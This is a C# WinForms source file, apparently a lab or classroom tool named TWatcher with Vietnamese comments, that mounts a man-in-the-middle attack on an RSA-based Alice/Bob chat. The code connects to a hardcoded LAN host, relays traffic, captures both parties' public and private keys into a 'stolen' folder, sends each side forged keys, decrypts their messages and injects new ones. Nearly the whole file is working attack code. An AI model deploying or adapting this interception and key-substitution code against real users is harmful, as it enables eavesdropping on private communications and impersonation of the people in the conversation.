using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TWatcher
{
    public partial class Form1 : Form
    {
        private TcpClient clientAlice;
        private TcpClient clientBob;

        private string InterceptedPublicKeyFromAlice;
        private string InterceptedPrivateKeyFromAlice;

        private string InterceptedPublicKeyFromBob;
        private string InterceptedPrivateKeyFromBob;

        private NetworkStream streamAlice;
        private NetworkStream streamBob;

        private NetworkStream streamToAlice;
        private NetworkStream streamToBob;

        public Form1()
        {
            InitializeComponent();
            InitializeKeys();
        }

        private async void btnStartMITM_Click(object sender, EventArgs e)
        {
            await StartMITM();
        }

        public static void InitializeKeys()
        {
            try
            {
                // Tạo đối tượng RSA
                using (RSA rsaTW = RSA.Create())
                {
                    // Đảm bảo thư mục chứa khóa tồn tại
                    string folderPath = @"C:\TWatcher\Keys\";
                    Directory.CreateDirectory(folderPath);

                    // Đường dẫn cho các tệp khóa
                    string alicePublicKeyPath = Path.Combine(folderPath, "Alice_PublicKey_Received.xml");
                    string bobPublicKeyPath = Path.Combine(folderPath, "Bob_PublicKey_Received.xml");

                    string alicePrivateKeyPath = Path.Combine(folderPath, "Alice_PrivateKey_Received.xml");
                    string bobPrivateKeyPath = Path.Combine(folderPath, "Bob_PrivateKey_Received.xml");

                    // Tạo khóa công khai giả mạo 
                    if (!File.Exists(alicePublicKeyPath))
                    {
                        // Khóa công khai giả mạo của Alice
                        string publicKeyXml = rsaTW.ToXmlString(false); // false cho khóa công khai
                        File.WriteAllText(alicePublicKeyPath, publicKeyXml);
                    }

                    if (!File.Exists(bobPublicKeyPath))
                    {
                        // Khóa công khai giả mạo của Bob
                        string publicKeyXml = rsaTW.ToXmlString(false); // false cho khóa công khai
                        File.WriteAllText(bobPublicKeyPath, publicKeyXml);
                    }

                    // Tạo khóa riêng tư giả mạo
                    if (!File.Exists(alicePrivateKeyPath))
                    {
                        // Khóa riêng tư giả mạo của Alice
                        string privateKeyXml = rsaTW.ToXmlString(true); // true cho khóa riêng tư
                        File.WriteAllText(alicePrivateKeyPath, privateKeyXml);
                    }

                    if (!File.Exists(bobPrivateKeyPath))
                    {
                        // Khóa riêng tư giả mạo của Bob
                        string privateKeyXml = rsaTW.ToXmlString(true); // true cho khóa riêng tư
                        File.WriteAllText(bobPrivateKeyPath, privateKeyXml);
                    }
                    Console.WriteLine($"Khóa T-Watcher đã được lưu tại: {folderPath}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Lỗi khi tạo và lưu khóa: {ex.Message}");
            }
        }

        private async Task StartMITM()
        {
            try
            {
                AppendLog("Đang chờ Alice mở kết nối...");

                TcpClient clientToAlice = new TcpClient();
                await clientToAlice.ConnectAsync("192.168.1.229", 12345); // Alice dang lang nghe cong 12345
                //await clientToAlice.ConnectAsync("192.168.1.230", 12345); // 12345-Main
                //await clientToAlice.ConnectAsync("192.168.76.136", 12345); // Alice dang lang nghe cong 12345 (VM Ware)

                streamToAlice = clientToAlice.GetStream();

                this.clientAlice = clientToAlice;
                this.streamAlice = streamToAlice;

                InvokeOnUIThread(() => txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã kết nối đến Alice.\r\n"));
                ConnectionLogger.Log("TWatcher đã chặn và kết nối đến Alice.");

                AppendLog("Đang chờ Bob kết nối...");

                // T-Watcher mo cong de ket noi voi Bob
                TcpListener bobListener = new TcpListener(IPAddress.Any, 54321);
                bobListener.Start();
                TcpClient clientToBob = await bobListener.AcceptTcpClientAsync();
                streamToBob = clientToBob.GetStream();

                InvokeOnUIThread(() => txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã kết nối đến Bob.\r\n"));
                ConnectionLogger.Log("Bob đã kết nối đến cổng giả mạo của TWatcher.");


                // Chuyen tiep du lieu
                _ = Task.Run(() => ForwardData(streamToAlice, streamToBob)); // Alice -> Bob
                _ = Task.Run(() => ForwardData(streamToBob, streamToAlice)); // Bob -> Alice

                // Nhan khoa Alice - Bob
                await Task.WhenAll(
                    ReceiveKeysFromAlice(streamToAlice),
                    ReceiveKeysFromBob(streamToBob)
                );

                await Task.WhenAll(
                    ReceiveEncryptedMessageFromBob(),
                    ReceiveEncryptedMessageFromAlice()
                );
            }
            catch (Exception ex)
            {
                AppendLog($"Lỗi MITM: {ex.Message}");
            }
        }

        private async Task ForwardData(NetworkStream input, NetworkStream output)
        {
            byte[] buffer = new byte[1024];
            int bytesRead;

            try
            {
                while (true)
                {
                    if (input.DataAvailable)
                    {
                        bytesRead = await input.ReadAsync(buffer, 0, buffer.Length);
                        if (bytesRead > 0)
                        {
                            await output.WriteAsync(buffer, 0, bytesRead);
                            await output.FlushAsync();
                        }
                        else
                        {
                            // Nếu không có dữ liệu đọc được, có thể kết nối đã bị ngắt
                            AppendLog("Kết nối bị ngắt.");
                            break;
                        }
                    }

                    await Task.Delay(10); // Giảm tải CPU
                }
            }
            catch (Exception ex)
            {
                // Xử lý lỗi khi kết nối bị mất hoặc có sự cố xảy ra
                AppendLog($"Lỗi chuyển tiếp: {ex.Message}");
            }
        }

        private void AppendLog(string msg)
        {
            if (txtOutput.InvokeRequired)
            {
                txtOutput.Invoke((MethodInvoker)(() =>
                {
                    txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\r\n");
                }));
            }
            else
            {
                txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\r\n");
            }
        }

        private void InvokeOnUIThread(Action action)
        {
            if (InvokeRequired)
            {
                Invoke(action);
            }
            else
            {
                action();
            }
        }

        // Nhan khoa cong khai va rieng tu
        //
        private async Task ReceiveKeysFromAlice(NetworkStream streamToAlice)
        {
            try
            {
                if (streamToAlice == null || !streamToAlice.CanRead)
                {
                    MessageBox.Show("Không thể đọc từ Alice!");
                    return;
                }

                byte[] buffer = new byte[4096]; // Tăng buffer đề phòng khóa dài
                int bytesRead;
                int keysReceived = 0;

                while ((bytesRead = await streamToAlice.ReadAsync(buffer, 0, buffer.Length)) > 0)
                {
                    string keyXml = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();

                    if (string.IsNullOrEmpty(keyXml) || !keyXml.StartsWith("<RSAKeyValue>"))
                    {
                        MessageBox.Show("Dữ liệu nhận được không hợp lệ!");
                        return;
                    }

                    if (keysReceived == 0)
                    {
                        // Nhận khóa công khai
                        InterceptedPublicKeyFromAlice = keyXml;
                        File.WriteAllText(@"C:\TWatcher_Received\Keys\Alice_PublicKey_Received.xml", keyXml);
                        InvokeOnUIThread(() =>
                        {
                            txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã chặn và lưu public key của Alice" + Environment.NewLine);
                        });
                    }
                    else if (keysReceived == 1)
                    {
                        // Nhận khóa riêng tư
                        InterceptedPrivateKeyFromAlice = keyXml;
                        File.WriteAllText(@"C:\TWatcher_Received\Keys\Alice_PrivateKey_Received.xml", keyXml);
                        InvokeOnUIThread(() =>
                        {
                            txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã chặn và lưu private key của Alice" + Environment.NewLine);
                        });
                    }

                    keysReceived++;

                    if (keysReceived >= 2)
                        break; // Đã nhận đủ 2 khóa, kết thúc
                }

                if (keysReceived == 0)
                {
                    MessageBox.Show("Không nhận được khóa nào từ Alice!");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi khi nhận khóa từ Alice: " + ex.Message);
            }
        }

        // Nhan khoa cong khai va rieng tu
        //
        private async Task ReceiveKeysFromBob(NetworkStream streamToBob)
        {
            try
            {
                if (streamToBob == null || !streamToBob.CanRead)
                {
                    MessageBox.Show("Không thể đọc từ Bob!");
                    return;
                }

                byte[] buffer = new byte[4096]; // Dự phòng khóa dài
                int bytesRead;
                int keysReceived = 0;

                while ((bytesRead = await streamToBob.ReadAsync(buffer, 0, buffer.Length)) > 0)
                {
                    string keyXml = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();

                    if (string.IsNullOrEmpty(keyXml) || !keyXml.StartsWith("<RSAKeyValue>"))
                    {
                        MessageBox.Show("Dữ liệu nhận được không hợp lệ từ Bob!");
                        return;
                    }

                    if (keysReceived == 0)
                    {
                        // Nhận khóa công khai
                        InterceptedPublicKeyFromBob = keyXml;
                        File.WriteAllText(@"C:\TWatcher_Received\Keys\Bob_PublicKey_Received.xml", keyXml);
                        InvokeOnUIThread(() =>
                        {
                            txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã chặn và lưu public key của Bob" + Environment.NewLine);
                        });
                    }
                    else if (keysReceived == 1)
                    {
                        // Nhận khóa riêng tư
                        InterceptedPrivateKeyFromBob = keyXml;
                        File.WriteAllText(@"C:\TWatcher_Received\Keys\Bob_PrivateKey_Received.xml", keyXml);
                        InvokeOnUIThread(() =>
                        {
                            txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã chặn và lưu private key của Bob" + Environment.NewLine);
                        });
                    }

                    keysReceived++;

                    if (keysReceived >= 2)
                        break; // Đã nhận đủ 2 khóa thì dừng
                }

                if (keysReceived == 0)
                {
                    MessageBox.Show("Không nhận được khóa nào từ Bob!");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi khi nhận khóa từ Bob: " + ex.Message);
            }
        }


        private void btnExit_Click(object sender, EventArgs e)
        {
            try
            {
                // Gửi thông báo ngắt kết nối cho Alice
                if (streamAlice != null && streamAlice.CanWrite)
                {
                    string disconnectMessage = "DISCONNECT";
                    byte[] messageBytes = Encoding.UTF8.GetBytes(disconnectMessage);
                    streamAlice.Write(messageBytes, 0, messageBytes.Length);
                    streamAlice.Flush();
                }

                // Gửi thông báo ngắt kết nối cho Bob
                if (streamBob != null && streamBob.CanWrite)
                {
                    string disconnectMessage = "DISCONNECT";
                    byte[] messageBytes = Encoding.UTF8.GetBytes(disconnectMessage);
                    streamBob.Write(messageBytes, 0, messageBytes.Length);
                    streamBob.Flush();
                }

                // Đóng các kết nối
                streamAlice?.Close();
                streamAlice = null;
                clientAlice?.Close();
                clientAlice = null;

                streamBob?.Close();
                streamBob = null;
                clientBob?.Close();
                clientBob = null;

                // Xóa các khóa giả mạo
                DeleteKeyFile(@"C:\TWatcher\Keys\Alice_PublicKey_Received.xml");
                DeleteKeyFile(@"C:\TWatcher\Keys\Alice_PrivateKey_Received.xml");

                DeleteKeyFile(@"C:\TWatcher\Keys\Bob_PublicKey_Received.xml");
                DeleteKeyFile(@"C:\TWatcher\Keys\Bob_PrivateKey_Received.xml");

                // Xóa các khóa đã chặn hoặc nhận
                DeleteKeyFile(@"C:\TWatcher_Received\Keys\Alice_PublicKey_Received.xml");
                DeleteKeyFile(@"C:\TWatcher_Received\Keys\Alice_PrivateKey_Received.xml");

                DeleteKeyFile(@"C:\TWatcher_Received\Keys\Bob_PublicKey_Received.xml");
                DeleteKeyFile(@"C:\TWatcher_Received\Keys\Bob_PrivateKey_Received.xml");


                // Thoát chương trình
                Application.Exit();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi khi thoát chương trình: " + ex.Message);
            }
        }

        private void DeleteKeyFile(string filePath)
        {
            if (File.Exists(filePath))
            {
                File.Delete(filePath);
                txtOutput.AppendText($"Đã xóa: {filePath}\r\n");
            }
        }

        // Alice - T-Watcher
        //
        // Gui khoa gia mao cho Alice
        private void btnSendKeyToAlice_Click(object sender, EventArgs e)
        {
            try
            {
                if (streamToAlice == null || !streamToAlice.CanWrite)
                {
                    MessageBox.Show("Không thể gửi khóa đến Alice. Kết nối không hợp lệ!");
                    return;
                }

                string fakePrivateKeyPath = @"C:\TWatcher\Keys\Bob_PrivateKey_Received.xml";
                string fakePublicKeyPath = @"C:\TWatcher\Keys\Bob_PublicKey_Received.xml";

                if (!File.Exists(fakePrivateKeyPath) || !File.Exists(fakePublicKeyPath))
                {
                    MessageBox.Show("Không tìm thấy file public key hoặc riêng tư của Bob giả mạo!");
                    return;
                }

                string fakePrivateKey = File.ReadAllText(fakePrivateKeyPath);
                string fakePublicKey = File.ReadAllText(fakePublicKeyPath);

                SaveTWatcherPublicKeyFingerprint(fakePublicKey, "Alice");

                byte[] privateKeyBytes = Encoding.UTF8.GetBytes(fakePrivateKey);
                byte[] publicKeyBytes = Encoding.UTF8.GetBytes(fakePublicKey);

                // Gửi khóa công khai trước
                streamToAlice.Write(publicKeyBytes, 0, publicKeyBytes.Length);
                streamToAlice.Flush();
                txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã gửi public key Bob giả mạo đến Alice" + Environment.NewLine);

                // Delay nhỏ để đảm bảo Alice phân biệt được 2 gói
                Thread.Sleep(300);

                // Gửi khóa riêng tư
                streamToAlice.Write(privateKeyBytes, 0, privateKeyBytes.Length);
                streamToAlice.Flush();
                txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã gửi private key Bob giả mạo đến Alice" + Environment.NewLine);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi khi gửi khóa giả mạo đến Alice: " + ex.Message);
            }
        }


        private void btnSendKeyToBob_Click(object sender, EventArgs e)
        {
            try
            {
                if (streamToBob == null || !streamToBob.CanWrite)
                {
                    MessageBox.Show("Không thể gửi khóa đến Bob. Kết nối không hợp lệ!");
                    return;
                }

                string fakePublicKeyPath = @"C:\TWatcher\Keys\Alice_PublicKey_Received.xml";
                string fakePrivateKeyPath = @"C:\TWatcher\Keys\Alice_PrivateKey_Received.xml";

                if (!File.Exists(fakePublicKeyPath) || !File.Exists(fakePrivateKeyPath))
                {
                    MessageBox.Show("Không tìm thấy file public key hoặc riêng tư của Alice giả mạo!");
                    return;
                }

                string fakePublicKey = File.ReadAllText(fakePublicKeyPath);
                string fakePrivateKey = File.ReadAllText(fakePrivateKeyPath);

                byte[] publicKeyBytes = Encoding.UTF8.GetBytes(fakePublicKey);
                byte[] privateKeyBytes = Encoding.UTF8.GetBytes(fakePrivateKey);

                // Gửi khóa công khai trước
                streamToBob.Write(publicKeyBytes, 0, publicKeyBytes.Length);
                streamToBob.Flush();
                txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã gửi public key Alice giả mạo đến Bob" + Environment.NewLine);

                // Delay nhỏ để tách biệt 2 gói
                Thread.Sleep(300);

                // Gửi khóa riêng tư
                streamToBob.Write(privateKeyBytes, 0, privateKeyBytes.Length);
                streamToBob.Flush();
                txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã gửi private key Alice giả mạo đến Bob" + Environment.NewLine);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi khi gửi khóa giả mạo đến Bob: " + ex.Message);
            }
        }

        private async Task ReceiveEncryptedMessageFromAlice()
        {
            try
            {
                string privateKeyAlicePath = @"C:\TWatcher\Keys\Alice_PrivateKey_Received.xml";

                if (!File.Exists(privateKeyAlicePath))
                {
                    this.Invoke(new Action(() => txtAliceMessage.AppendText("Không tìm thấy khóa riêng của Alice!\n")));
                    return;
                }

                RSA rsaAlicePrivate = RSA.Create();
                rsaAlicePrivate.FromXmlString(File.ReadAllText(privateKeyAlicePath));

                while (true)
                {
                    if (streamToAlice == null || !streamToAlice.CanRead)
                    {
                        this.Invoke(new Action(() => txtAliceMessage.AppendText($"[{DateTime.Now:HH:mm:ss}] Kết nối với Alice đã bị ngắt!\n")));
                        ConnectionLogger.Log("Alice đã ngắt kết nối.");
                        return;
                    }

                    byte[] buffer = new byte[1024];
                    int bytesRead = await streamToAlice.ReadAsync(buffer, 0, buffer.Length);

                    if (bytesRead > 0)
                    {
                        byte[] encryptedMessage = buffer.Take(bytesRead).ToArray();
                        byte[] decryptedMessage = rsaAlicePrivate.Decrypt(encryptedMessage, RSAEncryptionPadding.Pkcs1);
                        string message = Encoding.UTF8.GetString(decryptedMessage);

                        this.Invoke(new Action(() => txtAliceMessage.AppendText($"[{DateTime.Now:HH:mm:ss}] Alice (MITM): {message}\r\n")));
                    }
                    else
                    {
                        this.Invoke(new Action(() => txtAliceMessage.AppendText($"[{DateTime.Now:HH:mm:ss}] Kết nối với Alice đã bị ngắt!\n")));
                        ConnectionLogger.Log("Alice đã ngắt kết nối.");
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                this.Invoke(new Action(() => txtAliceMessage.AppendText("Lỗi khi nhận tin nhắn từ Alice: " + ex.Message + "\n")));
            }
        }
        private async Task ReceiveEncryptedMessageFromBob()
        {
            try
            {
                string privateKeyBobPath = @"C:\TWatcher\Keys\Bob_PrivateKey_Received.xml";

                if (!File.Exists(privateKeyBobPath))
                {
                    this.Invoke(new Action(() => txtBobMessage.AppendText("Không tìm thấy khóa riêng của Bob!\n")));
                    return;
                }

                RSA rsaBobPrivate = RSA.Create();
                rsaBobPrivate.FromXmlString(File.ReadAllText(privateKeyBobPath));

                while (true)
                {
                    if (streamToBob == null || !streamToBob.CanRead)
                    {
                        this.Invoke(new Action(() => txtBobMessage.AppendText($"[{DateTime.Now:HH:mm:ss}] Kết nối với Bob đã bị ngắt!\n")));
                        ConnectionLogger.Log("Bob đã ngắt kết nối.\r\n");
                        return;
                    }

                    byte[] buffer = new byte[1024];
                    int bytesRead = await streamToBob.ReadAsync(buffer, 0, buffer.Length);

                    if (bytesRead > 0)
                    {
                        byte[] encryptedMessage = buffer.Take(bytesRead).ToArray();
                        byte[] decryptedMessage = rsaBobPrivate.Decrypt(encryptedMessage, RSAEncryptionPadding.Pkcs1);
                        string message = Encoding.UTF8.GetString(decryptedMessage);

                        this.Invoke(new Action(() => txtBobMessage.AppendText($"[{DateTime.Now:HH:mm:ss}] Bob (MITM): {message}\r\n")));
                    }
                    else
                    {
                        this.Invoke(new Action(() => txtBobMessage.AppendText($"[{DateTime.Now:HH:mm:ss}] Kết nối với Bob đã bị ngắt!\n")));
                        ConnectionLogger.Log("Bob đã ngắt kết nối.\r\n");
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                this.Invoke(new Action(() => txtBobMessage.AppendText("Lỗi khi nhận tin nhắn từ Bob: " + ex.Message + "\n")));
            }
        }

        public static void SaveTWatcherPublicKeyFingerprint(string fakePublicKeyXml, string impersonatedName)
        {
            try
            {
                // 1. Tính fingerprint
                using (SHA256 sha256 = SHA256.Create())
                {
                    byte[] hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(fakePublicKeyXml));
                    string fingerprint = BitConverter.ToString(hashBytes).Replace("-", ":");

                    // 2. Đường dẫn file
                    string folderPath = @"C:\TWatcher\Fingerprints";
                    Directory.CreateDirectory(folderPath);
                    string fileName = $"Fingerprint.txt";
                    string fullPath = Path.Combine(folderPath, fileName);

                    // 3. Ghi vào file
                    string content = $"Fingerprint của khóa công khai TWatcher giả mạo {impersonatedName}:\r\n{fingerprint}";
                    File.WriteAllText(fullPath, content);

                    //MessageBox.Show($"Đã lưu fingerprint vào:\n{fullPath}", "Lưu fingerprint", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi khi lưu fingerprint: " + ex.Message);
            }
        }


        private async void btnSendToAlice_Click(object sender, EventArgs e)
        {
            try
            {
                string message = txtChatAlice.Text.Trim();
                if (string.IsNullOrEmpty(message))
                {
                    MessageBox.Show("Vui lòng nhập nội dung tin nhắn!");
                    return;
                }

                string publicKeyPath = @"C:\TWatcher_Received\Keys\Alice_PublicKey_Received.xml";
                if (!File.Exists(publicKeyPath))
                {
                    MessageBox.Show("Chưa nhận được public key của Alice!");
                    return;
                }

                RSA rsa = RSA.Create();
                rsa.FromXmlString(File.ReadAllText(publicKeyPath));
                byte[] encrypted = rsa.Encrypt(Encoding.UTF8.GetBytes(message), RSAEncryptionPadding.Pkcs1);

                if (streamToAlice != null && streamToAlice.CanWrite)
                {
                    await streamToAlice.WriteAsync(encrypted, 0, encrypted.Length);
                    txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã gửi tới Alice: {message}{Environment.NewLine}");
                }
                else
                {
                    MessageBox.Show("Không thể gửi tới Alice!");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi khi gửi tin nhắn tới Alice: " + ex.Message);
            }
        }

        private async void btnSendToBob_Click(object sender, EventArgs e)
        {
            try
            {
                string message = txtChatBob.Text.Trim();
                if (string.IsNullOrEmpty(message))
                {
                    MessageBox.Show("Vui lòng nhập nội dung tin nhắn!");
                    return;
                }

                string publicKeyPath = @"C:\TWatcher_Received\Keys\Bob_PublicKey_Received.xml";
                if (!File.Exists(publicKeyPath))
                {
                    MessageBox.Show("Chưa nhận được public key của Bob!");
                    return;
                }

                RSA rsa = RSA.Create();
                rsa.FromXmlString(File.ReadAllText(publicKeyPath));
                byte[] encrypted = rsa.Encrypt(Encoding.UTF8.GetBytes(message), RSAEncryptionPadding.Pkcs1);

                if (streamToBob != null && streamToBob.CanWrite)
                {
                    await streamToBob.WriteAsync(encrypted, 0, encrypted.Length);
                    txtOutput.AppendText($"[{DateTime.Now:HH:mm:ss}] Đã gửi tới Bob: {message}{Environment.NewLine}");
                }
                else
                {
                    MessageBox.Show("Không thể gửi tới Bob!");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi khi gửi tin nhắn tới Bob: " + ex.Message);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void btnOpenFakeFolder_Click(object sender, EventArgs e)
        {
            string folderPath = @"C:\TWatcher";

            if (Directory.Exists(folderPath))
            {
                Process.Start("explorer.exe", folderPath);
            }
            else
            {
                MessageBox.Show("Thư mục không tồn tại! ");
            }
        }

        private void btnOpenStolenFolder_Click(object sender, EventArgs e)
        {
            string folderPath = @"C:\TWatcher_Received\Keys";

            if (Directory.Exists(folderPath))
            {
                Process.Start("explorer.exe", folderPath);
            }
            else
            {
                MessageBox.Show("Thư mục không tồn tại! ");
            }
        }

        private void btnViewHistory_Click(object sender, EventArgs e)
        {
            frmHistory historyForm = new frmHistory();
            historyForm.ShowDialog(); // hoặc Show() nếu bạn muốn mở nhiều lần
        }

        private void btnSaveChatHistory_Click(object sender, EventArgs e)
        {
            string logFolder = @"C:\TWatcher\Logs";
            Directory.CreateDirectory(logFolder); // đảm bảo thư mục tồn tại

            string fileName = $"ChatHistory_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
            string fullPath = Path.Combine(logFolder, fileName);

            // Lấy toàn bộ nội dung các tin nhắn
            string content = "===== Tin nhắn từ Alice =====\r\n" +
                             txtAliceMessage.Text +
                             "\r\n\r\n===== Tin nhắn từ Bob =====\r\n" +
                             txtBobMessage.Text;

            try
            {
                File.WriteAllText(fullPath, content, Encoding.UTF8);
                MessageBox.Show("Đã lưu lịch sử trò chuyện!\n");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi khi lưu lịch sử: " + ex.Message, "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }

    public static class ConnectionLogger
    {
        private static readonly string logFilePath = @"C:\Alice\Logs\AliceBob_ConnectionHistory.txt";

        public static void Log(string message)
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(logFilePath)); // Đảm bảo thư mục tồn tại

                string timestamp = DateTime.Now.ToString("[HH:mm:ss]");
                File.AppendAllText(logFilePath, $"{timestamp} {message}\r\n");
            }
            catch (Exception ex)
            {
                // Có thể ghi lỗi ra debug log nếu cần
                Console.WriteLine("Lỗi khi ghi log lịch sử kết nối: " + ex.Message);
            }
        }
    }

}
